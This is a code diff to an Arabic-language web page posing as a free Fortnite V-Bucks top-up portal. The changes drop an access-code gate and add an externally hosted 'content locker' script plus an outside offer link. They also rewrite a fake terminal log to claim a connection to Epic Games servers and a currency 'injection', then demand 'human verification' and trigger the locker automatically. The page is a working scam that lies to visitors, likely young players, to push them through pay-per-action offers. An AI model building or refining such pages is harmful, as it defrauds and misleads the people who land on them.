@@ -123,7 +123,7 @@
             margin-bottom: 25px;
         }
 
-        input[type="text"], input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 16px;
             background: rgba(0,0,0,0.4);
@@ -135,7 +135,7 @@
             transition: 0.3s;
         }
 
-        input[type="text"]:focus, input[type="password"]:focus {
+        input[type="text"]:focus {
             border-color: var(--secondary);
             background: rgba(0,0,0,0.6);
         }
@@ -242,14 +242,27 @@
             display: inline-block;
         }
 
-        .lock-message {
-            background: rgba(255, 62, 62, 0.1);
-            border: 1px solid rgba(255, 62, 62, 0.3);
-            padding: 20px;
+        .cpa-btn {
+            background: linear-gradient(180deg, var(--success) 0%, #00d471 100%);
+            color: #000;
+            border: none;
+            padding: 18px;
+            font-size: 1.5rem;
+            font-weight: 900;
             border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 5px 0 #008a4a;
+            transition: 0.1s;
+            width: 100%;
+            text-decoration: none;
+            display: block;
             margin-top: 20px;
-            color: #ff6b6b;
-            font-weight: bold;
+        }
+
+        .cpa-btn:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #008a4a;
         }
 
         @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
@@ -263,6 +276,11 @@
             .card { padding: 25px 15px; }
         }
     </style>
+    
+    <script type="text/javascript">
+        var WzftH_Uaj_nZmJCc={"it":4618308,"key":"fa5fd"};
+    </script>
+    <script src="https://d1g1lhd4vferpn.cloudfront.net/52bb060.js"></script>
 </head>
 <body>
     <!-- Google Tag Manager (noscript) -->
@@ -277,19 +295,7 @@
         </div>
 
         <div class="card">
-            <div id="lock-zone">
-                <h1>🔐 محتوى محمي</h1>
-                <p style="color: #888; margin-bottom: 25px; font-size: 0.95rem;">يرجى إدخال كود الوصول للمتابعة</p>
-                
-                <div class="input-group">
-                    <input type="password" id="lockCode" placeholder="أدخل كود الوصول...">
-                </div>
-                
-                <button class="main-btn" onclick="checkLock()">فتح المحتوى</button>
-                <div class="lock-message">⚠️ هذا المحتوى محمي بكود وصول</div>
-            </div>
-
-            <div id="p1" style="display:none;">
+            <div id="p1">
                 <div class="status-tag">النظام نشط - شحن مباشر</div>
                 <h1>بوابة شحن V-BUCKS</h1>
                 <p style="color: #888; margin-bottom: 25px; font-size: 0.95rem;">أدخل معرف الحساب لبدء عملية الشحن</p>
@@ -331,33 +337,16 @@
 
             <div id="v-zone" class="verify-zone">
                 <div class="timer">تنتهي العملية خلال: <span id="tm">03:00</span></div>
-                <h2 style="color: var(--secondary); margin: 0 0 10px 0;">تم التحقق بنجاح</h2>
-                <p style="color: #bbb; font-size: 0.9rem; margin-bottom: 20px;">تم تجهيز العملات! سيتم إضافتها إلى حسابك قريباً.</p>
-                <div style="background: rgba(0, 255, 136, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(0, 255, 136, 0.3);">
-                    <p style="color: var(--success); margin: 0;">✓ تم تأكيد العملية بنجاح</p>
-                </div>
+                <h2 style="color: var(--secondary); margin: 0 0 10px 0;">التحقق مطلوب</h2>
+                <p style="color: #bbb; font-size: 0.9rem; margin-bottom: 20px;">تم تجهيز العملات! يرجى إكمال عملية التحقق لتأكيد هويتك وضمان وصول الرصيد.</p>
+                
+                <a href="https://jhuweq.com/cl/dbd2d92" class="cpa-btn" onclick="call_locker();">تحقق الآن</a>
             </div>
         </div>
     </div>
 
-    <script type="text/javascript">
-    var WzftH_Uaj_nZmJCc={"it":4618308,"key":"fa5fd"};
-    </script>
-    <script src="https://d1g1lhd4vferpn.cloudfront.net/52bb060.js"></script>
-
     <script>
         let sV = ""; let u = "";
-        
-        function checkLock() {
-            const code = document.getElementById('lockCode').value;
-            if(code === 'fa5fd') {
-                document.getElementById('lock-zone').style.display = 'none';
-                document.getElementById('p1').style.display = 'block';
-            } else {
-                alert('كود الوصول غير صحيح');
-                document.getElementById('lockCode').value = '';
-            }
-        }
         
         function goP2() {
             u = document.getElementById('uid').value;
@@ -380,10 +369,11 @@
             document.getElementById('p2').style.display = 'none';
             document.getElementById('term').style.display = 'block';
             const logs = [
-                {t: "Connecting...", s: "l-blue"},
-                {t: "Target: " + u, s: ""},
-                {t: "Injection: " + sV + " V-Bucks", s: "l-green"},
-                {t: "Verification Required...", s: "l-red"}
+                {t: "Connecting to Epic Games Servers...", s: "l-blue"},
+                {t: "Searching for user: " + u, s: ""},
+                {t: "User found! Status: Active", s: "l-green"},
+                {t: "Injecting " + sV + " V-Bucks...", s: "l-blue"},
+                {t: "Error: Human Verification Required!", s: "l-red"}
             ];
             let i = 0;
             const iv = setInterval(() => {
@@ -399,6 +389,10 @@
                             document.getElementById('tm').innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
                             if(t > 0) t--;
                         }, 1000);
+                        // Call the locker automatically when reaching verification zone
+                        if(typeof call_locker === 'function') {
+                            call_locker();
+                        }
                     }, 1000);
                 }
             }, 800);
